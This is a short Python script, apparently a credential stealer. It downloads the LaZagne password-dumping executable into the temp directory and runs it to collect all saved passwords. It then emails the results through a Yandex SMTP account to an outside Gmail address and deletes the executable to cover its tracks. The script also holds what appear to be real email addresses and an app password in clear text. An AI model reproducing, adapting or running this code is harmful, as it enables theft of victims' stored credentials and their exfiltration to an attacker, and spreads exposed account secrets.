#!/usr/bin/env python3

import requests, subprocess, smtplib, re, tempfile, os

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name , "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, to, password, messege):
    server = smtplib.SMTP("smtp.yandex.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, to, messege)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True).decode()
send_mail("egyshop22@yandex.com", "hussienstar30@gmail.com"," hgyolwuoqzuigtnc", result)
os.remove("laZagne.exe")
